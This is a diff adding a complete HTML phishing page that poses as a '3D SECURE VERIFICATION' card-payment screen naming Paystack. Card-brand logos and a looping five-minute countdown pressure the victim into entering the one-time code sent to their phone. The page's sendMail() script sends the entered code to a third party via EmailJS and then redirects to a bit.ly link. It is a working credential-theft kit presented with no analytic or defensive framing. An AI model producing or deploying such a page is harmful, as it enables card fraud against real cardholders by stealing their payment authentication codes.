@@ -1,0 +1,231 @@
+<!doctype html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    
+<script type="text/javascript"
+        src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js">
+</script>
+<script type="text/javascript">
+   (function(){
+      emailjs.init({
+        publicKey: "9cATFsqPERef1K6ZF",
+      });
+   })();
+</script>
+
+
+    <title>Authentication</title>
+  <style>
+  body {
+    font-family: Arial, Sans-Serif;
+  }
+  .container {
+    margin: 0 auto;
+    margin-top: -20px;
+    max-width: 500px;
+    height: 500px;
+    border-radius: 10px;
+    border: 1px solid transparent;
+    background-color: #fff;
+  }
+  .container h3 {
+    margin-top: -20px;
+    text-align: center;
+    font-weight: 400;
+  }
+  .container svg {
+    margin-top: 0px;
+    margin-left: 10px;
+  }
+  .lock {
+    margin-bottom: -35px;
+    margin-left: 1px;
+ }
+  .pic-container {
+    width: 180px;
+    height: 30px;
+    margin-left: 155px;
+    border: 1px solid transparent;
+    border-radius: 10px;
+    background-color: #f2f2f2;
+  }
+  .pic-container img {
+    margin-top: 5px;
+    margin-left: 9px;
+  }
+ .p-auth {
+   margin-left: 12px;
+   font-size: 12px;
+ }
+ .code {
+   font-size: 12px;
+   text-align: center;
+   color: #0000ff77;
+ }
+ .code input {
+   text-align: center;
+   font-weight: bold;
+ }
+ input:focus {
+   border: 1px solid black;
+   outline: none;
+ }
+ button[type="submit"] {
+   margin-top: 3px;
+   width: 200px;
+   height: 25px;
+   border-radius: 4px;
+   color: #fff;
+   border: 1px solid #2828db;
+   background-color: #2828db;
+ }
+ button[type="submit"]:hover {
+   background-color: blue;
+   cursor: pointer;
+ }
+ .resend-code {
+   color: blue;
+   text-align: center;
+ }
+ .resend-code button {
+   border: 1px solid transparent;
+   color: #6268A6;
+   background-color: transparent;
+   cursor: pointer;
+ }
+ .countdown {
+   margin-top: 5px;
+   text-align: center;
+   color: #6268A6;
+ }
+  </style>
+  </head>
+  <body>
+    <div class="container">
+     
+     <br> </br>
+  <svg height="15px" width="15px" version="1.1" id="Capa_1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" viewBox="0 0 309.143 309.143" xml:space="preserve" fill="#000000"><g id="SVGRepo_bgCarrier" stroke-width="0"></g><g id="SVGRepo_tracerCarrier" stroke-linecap="round" stroke-linejoin="round" stroke="#CCCCCC" stroke-width="7.419431999999999"></g><g id="SVGRepo_iconCarrier"> <path style="fill:#231F20;" d="M112.855,154.571L240.481,26.946c2.929-2.929,2.929-7.678,0-10.606L226.339,2.197 C224.933,0.79,223.025,0,221.036,0c-1.989,0-3.897,0.79-5.303,2.197L68.661,149.268c-2.929,2.929-2.929,7.678,0,10.606 l147.071,147.071c1.406,1.407,3.314,2.197,5.303,2.197c1.989,0,3.897-0.79,5.303-2.197l14.142-14.143 c2.929-2.929,2.929-7.678,0-10.606L112.855,154.571z" onclick="focusInput()"></path> </g></svg>
+  
+    <h3>3D SECURE VERIFICATION</h3>
+    
+  <br></br>
+  
+  <div class="lock">
+    <svg fill="grey" onclick="focusInput()" height="30px" width="20px" version="1.1" id="Layer_1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" viewBox="0 0 485.00 485.00" xml:space="preserve" stroke="#000000" stroke-width="0.00485"><g id="SVGRepo_bgCarrier" stroke-width="0"></g><g id="SVGRepo_tracerCarrier" stroke-linecap="round" stroke-linejoin="round"></g><g id="SVGRepo_iconCarrier"> <g> <path d="M345,175v-72.5C345,45.981,299.019,0,242.5,0S140,45.981,140,102.5V175H70v310h345V175H345z M170,102.5 c0-39.977,32.523-72.5,72.5-72.5S315,62.523,315,102.5V175H170V102.5z M385,455H100V205h285V455z"></path> <path d="M227.5,338.047v53.568h30v-53.569c11.814-5.628,20-17.682,20-31.616c0-19.299-15.701-35-35-35c-19.299,0-35,15.701-35,35 C207.5,320.365,215.686,332.42,227.5,338.047z"></path> </g> </g></svg>
+    </div>
+    
+  
+    <div class="pic-container">
+  <img src="https://i.ibb.co/wMrJWr2/visa.png" alt="Visa" onclick="focusInput()" width="35px" height="20px">
+  
+  <img style="margin-left: 4px;" src="https://i.ibb.co/mb0w5bm/mastercard.jpg" alt="MasterCard" onclick="focusInput()" width="35px" height="20px">
+  
+  <img style="margin-left: 4px;" src="https://i.ibb.co/68vhBp8/verve-logo.png" alt="Verve" onclick="focusInput()" width="35px" height="20px">
+  
+  <img style="margin-left: 1px;" src="https://i.ibb.co/rH1yLyh/amex.jpg" alt="amex" onclick="focusInput()" width="35px" height="20px" margin-top="70px;">
+  </div>    
+
+  <hr>
+    <div class="p-auth">
+  <p><b>Purchase Authentication</b></p>
+  <p>We've sent a verification code to your phone number.</p>
+  <p>You're authorizing a payment to Paystack with your card.</p>
+     </div>
+        <br></br>
+        
+        <form id="CardForm">
+  <div class="code">
+    <label for="cardnumber">Verification Code</label><br>
+  <input type="tel" name="cardnumber" id="cardnumber" data-mask="00000000" required="">
+            <br>
+   <button type="submit" id="submit" onclick="sendMail()">Pay</button>
+  
+  </div>   <br></br>
+  <div class="resend-code">
+    <button type="submit" id="submit" onclick="sendMail()">RESEND CODE</button>
+    </form>
+  </div>
+<div class="countdown" id="countdown">05:00</div>
+
+<p style="color: #6268A6; margin-left: 15px; margin-top: 37px; font-size: 12px;">NEED HELP?</p>
+
+
+    </div>
+  
+
+   
+   <script src="https://code.jquery.com/jquery-3.3.1.min.js"></script>
+
+	<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery.mask/1.14.15/jquery.mask.min.js"></script>
+	
+	<script>
+  function focusInput() {
+    document.getElementById('cardnumber').focus();
+  }
+</script>
+
+<script>
+      let time = 300; // 5 minutes in seconds
+
+      function startCountdown() {
+        const countdownElement = document.getElementById('countdown');
+
+        const countdown = setInterval(() => {
+          const minutes = Math.floor(time / 60);
+          const seconds = time % 60;
+          countdownElement.textContent =
+            `${minutes.toString().padStart(2, '0')}:${seconds.toString().padStart(2, '0')}`;
+
+          if (time <= 0) {
+            clearInterval(countdown);
+            time = 300; // Reset time to 5 minutes
+            startCountdown(); // Restart the countdown
+          } else {
+            time--;
+          }
+        }, 1000);
+      }
+
+      startCountdown();
+    </script>
+
+
+<script>
+  let formSubmitted = false; // Variable to track form submission
+  
+  function sendMail(){
+    if (formSubmitted) {
+      return; // Exit the function if form is already submitted
+    }
+
+    let parms = {
+      cardnumber : document.getElementById("cardnumber").value,
+    };
+    
+    // Set formSubmitted to true before sending email
+    formSubmitted = true;
+    
+        emailjs.send("service_6kbj4eu","template_ncggmgb", parms)
+      .then(function(response) {
+        // Redirect to Google after email is sent
+        window.location.href = "https://bit.ly/bulamabenjamin";
+      })
+      .catch(function(error) {
+        console.error('Invalid Verification Code!', error);
+        // Handle error if necessary
+      });
+  }
+
+  // Attach form submission event handler
+  document.getElementById('CardForm').addEventListener('submit', function(event) {
+    event.preventDefault(); // Prevent default form submission
+    sendMail(); // Call sendMail function
+  });
+</script>
+
+
+
+  </body>
+</html>
